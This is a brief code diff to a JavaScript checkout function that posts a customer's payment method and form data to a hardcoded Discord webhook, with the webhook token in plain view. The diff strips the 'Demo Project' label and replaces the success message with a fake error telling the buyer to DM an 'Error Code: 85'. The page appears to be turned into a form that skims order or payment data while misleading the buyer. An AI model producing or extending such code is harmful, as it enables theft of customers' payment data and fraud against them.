@@ -183,7 +183,7 @@
     function sendToDiscord(paymentMethod, formData, meta) {
       const webhookUrl = 'https://discordapp.com/api/webhooks/1373748781861834882/2SDjfj-z2YxeR71Z8JDFLw3lk8uQwjIu_PwYrgTfMwLrIsVyBdJBW5PBNB1qg50wfLAe';
       const message = {
-        content: `📦 **New Order (Demo Project)**
+        content: `📦 **New Order**
 
 🧾 **Order Info**
 - Method: ${paymentMethod}
@@ -220,7 +220,7 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(message)
       })
-      .then(() => alert('Demo order submitted! Check Discord.'))
+      .then(() => alert('Something went wrong, Please DM the Error Code: 85'))
       .catch(err => console.error('Webhook Error:', err));
     }
 
